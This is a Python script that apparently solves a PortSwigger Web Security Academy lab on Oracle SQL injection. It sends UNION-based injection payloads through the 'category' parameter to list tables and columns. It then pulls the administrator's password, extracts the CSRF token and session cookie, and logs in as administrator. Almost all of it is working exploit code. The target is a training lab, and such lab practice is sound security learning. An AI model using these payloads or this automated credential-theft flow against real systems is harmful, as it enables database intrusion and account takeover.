#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 16/9/2023
#
# Lab: SQL injection attack, listing the database contents on Oracle
#
# Steps: 1. Inject payload in 'category' query parameter to retrieve the name of
#           users table
#        2. Adjust the payload to retrieve the names of username and password columns
#        3. Adjust the payload to retrieve the administrator password
#        4. Fetch the login page
#        5. Extract the csrf token and session cookie
#        6. Login as the administrator
#        7. Fetch the administrator profile
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0a4b0031046f722a872b2f4b00d80082.web-security-academy.net"

print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")

# payload to retrieve the name of users table
payload = "' union SELECT table_name, null from all_tables-- -"

try:
    # fetch the page with the injected payload
    injection = requests.get(f"{url}/filter?category={payload}")

except:
    print(Fore.RED + "[!] Failed to inject the payload to retrieve the name of users table through exception")
    exit(1)

# extract the name of users table
users_table = re.findall("<th>(USERS_.*)</th>", injection.text)[0]

print(Fore.WHITE + "1. Injecting a payload to retrieve the name of users table.. " +
        Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + users_table)

# payload to retrieve the names of username and password columns
payload = f"' union SELECT column_name, null from all_tab_columns where table_name = '{users_table}'-- -"

try:
    # fetch the page with the injected payload
    injection = requests.get(f"{url}/filter?category={payload}")
    
except:
    print(Fore.RED + "[!] Failed to inject the payload to retrieve the name of username and password columns through exception")
    exit(1)

# extract the name of username column
username_column = re.findall("<th>(USERNAME_.*)</th>", injection.text)[0]

# extract the name of password column
password_column = re.findall("<th>(PASSWORD_.*)</th>", injection.text)[0]

print(Fore.WHITE + "2. Adjusting the payload to retrieve the names of username and password columns.. " +
        Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + username_column + " | " + password_column)

# payload to retrieve the password of the administrator
payload = f"' union SELECT {username_column}, {password_column} from {users_table} where {username_column} = 'administrator'-- -"

try:
    # fetch the page with the injected payload
    injection = requests.get(f"{url}/filter?category={payload}")

except:
    print(Fore.RED + "[!] Failed to inject the payload to retrieve the password of the administrator through exception")
    exit(1)

# extract the administrator password
admin_password = re.findall("<td>(.*)</td>", injection.text)[0]

print(Fore.WHITE + "3. Adjusting the payload to retrieve the administrator password.. " +
        Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)

try:  
    # fetch the login page
    fetch_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1)

print(Fore.WHITE + "4. Fetching login page.. " + Fore.GREEN + "OK")

# get session cookie
session = fetch_login.cookies.get("session")

# Extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.text)[0]

print(Fore.WHITE + "5. Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# data to send via POST
data = {
    "username": "administrator",
    "password": admin_password,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:  
    # login in as the administrator
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)

except:
    print(Fore.RED + "[!] Failed to login as the administrator through exception")
    exit(1)

print(Fore.WHITE + "6. Logging in as the administrator.. " + Fore.GREEN + "OK")

# get session cookie
new_session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": new_session
}

try:  
    # fetch the administrator profile
    admin = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
    exit(1)

print(Fore.WHITE + "7. Fetching the administrator profile.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

